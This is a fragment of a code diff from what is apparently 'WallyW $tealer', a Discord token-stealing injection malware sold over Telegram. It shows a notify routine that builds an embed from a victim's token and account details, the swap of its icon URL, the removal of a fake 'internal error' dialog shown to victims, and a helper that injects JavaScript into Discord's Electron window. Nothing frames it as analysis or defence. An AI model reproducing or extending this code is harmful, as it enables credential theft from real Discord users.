@@ -176,7 +176,7 @@ const notify = async (ctx, token, acc) => {
         };
         e.footer = {
             text: "WallyW $tealer | @t.me/wm4rket",
-            icon_url: "https://cdn.discordapp.com/attachments/1232070620699693119/1270552282043383900/wallywspin.gif?ex=66b41d85&is=66b2cc05&hm=2f8d6a480fff1b5a18d909ea3736de04df6658f555fe6ba92c0caf4b52db2349&"
+            icon_url: "https://cdn.discordapp.com/attachments/1233084065280692264/1273676077469798451/wallywlogo.png?ex=66c02388&is=66bed208&hm=83f8acc49e30aed2e31893b6ef18096dbd4c7bdb24247c43e9df0ebdbb2ed768&"
         };
     });
 
@@ -194,7 +194,6 @@ const decodeB64 = (s) =>
 
 const execScript = async (s) =>
     await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(s, !0);
-    dialog.showErrorBox("Ops!", "An internal error occurred in the Discord API.");
 
 const fetch = async (e, h) =>
     JSON.parse(await request("GET", `${[
